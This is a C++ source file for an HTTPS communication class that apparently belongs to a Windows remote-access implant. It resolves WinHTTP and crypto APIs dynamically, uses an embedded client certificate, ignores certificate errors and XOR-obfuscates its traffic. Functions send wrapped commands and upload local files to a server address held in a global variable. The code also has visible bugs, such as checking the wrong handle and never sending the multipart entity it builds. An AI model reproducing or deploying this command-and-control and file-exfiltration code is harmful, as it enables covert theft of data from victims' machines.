


#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <utility>
#include <tchar.h>

#include "https.h"

#include "FileHelper.h"

#include "utils.h"
#include "public.h"

#include "packet.h"
#include "utils.h"
#include "api.h"

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "winhttp.lib")



using namespace std;


HttpsProto::HttpsProto() {

}


HttpsProto::HttpsProto(wchar_t* ip, unsigned short port, wchar_t* app) :HttpProto(ip,port,app){
	

}

HttpsProto:: HttpsProto(int isPost) :HttpProto(isPost) {

	setPort(HTTPS_PORT);
}


HttpsProto:: ~HttpsProto() {

}


bool HttpsProto::httpRequest(char* data, int datasize) {

	int ret = 0;

	int retry = 0;

	BOOL  bResults = FALSE;

	DWORD dwSize = 0;
	DWORD dwRead = 0;
	
	HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

	LPCTSTR szAcceptType = _T("text/*");
	LPCTSTR szAcceptTypes[2] = { szAcceptType,NULL };

	char* file = 0;
	int filesize = 0;
	LPCTSTR pszPassWord = _T(CERT_PROTECT_KEY);
	CRYPT_DATA_BLOB PFX;
	HCERTSTORE pfxStore;
	PCCERT_CONTEXT pcontext = NULL, clientCertContext = NULL;

	hSession = lpWinHttpOpen(MY_USERAGENT,WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) 
	{
		runLog("%s:%s error code:%d\r\n", __FILE__, __FUNCTION__, GetLastError());
		goto _END;
	}

	hConnect = lpWinHttpConnect(hSession, m_ip, m_port, 0);
	if (!hConnect) 
	{
		runLog("%s:%s error code:%d\r\n", __FILE__, __FUNCTION__, GetLastError());
		goto _END;
	}

	hRequest = lpWinHttpOpenRequest(hConnect, m_action.c_str(), m_app ,NULL, WINHTTP_NO_REFERER,
		(LPCWSTR*)&szAcceptTypes,WINHTTP_FLAG_SECURE);
	if (!hConnect)
	{
		runLog("%s:%s error code:%d\r\n", __FILE__, __FUNCTION__, GetLastError());
		goto _END;
	}

	//ret = FileHelper::fileReader("server.p12", &file, &filesize);
	file = (char*)getCertFile(&filesize);
	if (filesize <= 0)
	{
		goto _END;
	}
	// Convert a .pfx or .p12 file image to a Certificate store
	PFX.pbData = (BYTE*)file;
	PFX.cbData = filesize;
	pfxStore = lpPFXImportCertStore(&PFX, pszPassWord, 0);
	if (NULL == pfxStore)
	{
		runLog("%s:%s error code:%d\r\n", __FILE__, __FUNCTION__, GetLastError());
		goto _END;
	}


	while (pcontext = lpCertEnumCertificatesInStore(pfxStore, pcontext)) {

		clientCertContext = lpCertDuplicateCertificateContext(pcontext); // CertEnumCertificatesInStore frees its passed in pcontext !

		ret = lpWinHttpSetOption(hRequest, WINHTTP_OPTION_CLIENT_CERT_CONTEXT, (LPVOID)clientCertContext, sizeof(CERT_CONTEXT));
		if (FALSE == ret)
		{
			runLog("%s:%s error code:%d\r\n", __FILE__, __FUNCTION__, GetLastError());

			lpCertCloseStore(pfxStore, 0);
			lpCertFreeCertificateContext(clientCertContext);

			goto _END;
		}
		else
		{
			//success
			lpCertCloseStore(pfxStore, 0);
			lpCertFreeCertificateContext(clientCertContext);
			break;
		}
	}

	// Certain circumstances dictate that we may need to loop on WinHttpSendRequest ,hence the do/while
	retry = 3;
	do
	{	
		ret = NO_ERROR;

		std::wstring cl;
		BuildContentLength(datasize, cl);
		ret = lpWinHttpAddRequestHeaders(hRequest, cl.c_str(), -1L, 0);
		if (!ret) {
			break;
		}

		std::wstring gzip = L"";
		BuildGzip(gzip);
		//ret = WinHttpAddRequestHeaders(hRequest, gzip.c_str(), -1L, 0);

		// no retry on success, possible retry on failure
		ret = lpWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 0, 0, 0, NULL);
		if (ret == FALSE)
		{
			ret = GetLastError();

			// (1) If you want to allow SSL certificate errors and continue
			// with the connection, you must allow and initial failure and then
			// reset the security flags. From: "HOWTO: Handle Invalid Certificate
			// Authority Error with WinInet"
			// http://support.microsoft.com/default.aspx?scid=kb;EN-US;182888
			if (ret == ERROR_WINHTTP_SECURE_FAILURE)
			{
				DWORD dwFlags =SECURITY_FLAG_IGNORE_UNKNOWN_CA |SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
					SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
				ret = lpWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
				if (ret)
				{
				}
			}
			// (2) Negotiate authorization handshakes may return this error
			// and require multiple attempts
			// http://msdn.microsoft.com/en-us/library/windows/desktop/aa383144%28v=vs.85%29.aspx
			else if (ret == ERROR_WINHTTP_RESEND_REQUEST)
			{
				
			}

			retry--;
		}
		else
		{
			bResults = TRUE;

			if (data && datasize)
			{
				xor_crypt(data, datasize);

				ret = lpWinHttpWriteData(hRequest, data, datasize, &dwSize);
				if (ret == 0) {
					bResults = FALSE;
					
				}
			}

			break;
		}
	} while (retry);

	if (bResults) {
		bResults = lpWinHttpReceiveResponse(hRequest, NULL);
	}

	if (bResults)
	{
		vector<char*> response;
		int respLen = 0;
		ret = lpWinHttpQueryDataAvailable(hRequest, &dwSize);
		if (dwSize > 0 && ret) {
			int freesize = BUFFER_SIZE;
			char* databuf = new char[BUFFER_SIZE];
			response.push_back(databuf);

			while (ret && dwSize > 0)
			{
				if (dwSize > freesize)
				{
					ret = lpWinHttpReadData(hRequest, databuf, freesize, &dwRead);
				}
				else
				{
					ret = lpWinHttpReadData(hRequest, databuf, dwSize, &dwRead);
				}
				if (ret == 0 || dwRead <= 0)
				{
					break;
				}

				databuf += dwRead;
				freesize -= dwRead;
				respLen += dwRead;
				if (freesize <= 0)
				{
					freesize = BUFFER_SIZE;
					databuf = new char[BUFFER_SIZE];
					response.push_back(databuf);
				}

				ret = lpWinHttpQueryDataAvailable(hRequest, &dwSize);
			}
		}

		if (response.size() > 0 && respLen > 0)
		{
			if (m_resp)
			{
				delete m_resp;
				m_resp = 0;
			}
			m_resp = new char[response.size() * BUFFER_SIZE + 16];
			char* ptr = m_resp;
			m_respLen = respLen;
			for (int i = 0; i < response.size(); i++)
			{
				memcpy(ptr, response[i], BUFFER_SIZE);
				ptr += BUFFER_SIZE;
				delete response[i];
			}
		}
	}

	if (!bResults) {
		runLog("%s %s Error %d has occurred.\n",__FILE__ ,__FUNCTION__, GetLastError());
	}

	lpWinHttpSetStatusCallback(hSession,NULL,WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS,NULL);

_END:
	if (hRequest) {
		lpWinHttpCloseHandle(hRequest);
	}
	if (hConnect) {
		lpWinHttpCloseHandle(hConnect);
	}
	if (hSession) {
		lpWinHttpCloseHandle(hSession);
	}
	
	return bResults;
}







bool HttpsProto::postHttpsCmd(const char* cmd) {

	PacketParcel pack;

	char* data = 0;
	int datasize = 0;
	int ret = 0;

	ret = pack.cmdWrapper(0, 0, cmd, &data, &datasize);

	ret = httpRequest(data, datasize);

	delete data;

	return ret;
}


bool HttpsProto::postTest(string filename, char* file, int filesize)
{
	int ret = 0;
	char* postentity = 0;
	int entitysize = makeFileEntity(file, filesize, filename.c_str(), &postentity);

	char response[MAX_SIZE];

	int backsize = MAX_SIZE;

	ret = httpRequest(file, filesize);

	return ret;
}



int uploadHttpsFile(const char* filename) {
	int ret = 0;

	char* file = 0;
	int filesize = 0;
	ret = FileHelper::fileReader(filename, &file, &filesize);
	if (ret > 0)
	{

		WCHAR strapp[MAX_SIZE];
		wcscpy_s(strapp, sizeof(strapp) / sizeof(WCHAR), MY_PHP_SERVER);

		in_addr ia;
		ia.S_un.S_addr = g_ip;
		string strip = inet_ntoa(ia);

		WCHAR wstrip[256];
		mbstowcs(wstrip, strip.c_str(), sizeof(wstrip) / sizeof(WCHAR));

		HttpsProto https(wstrip, HTTPS_PORT, strapp);

		https.postTest(filename, file, filesize);

	}

	return ret;
}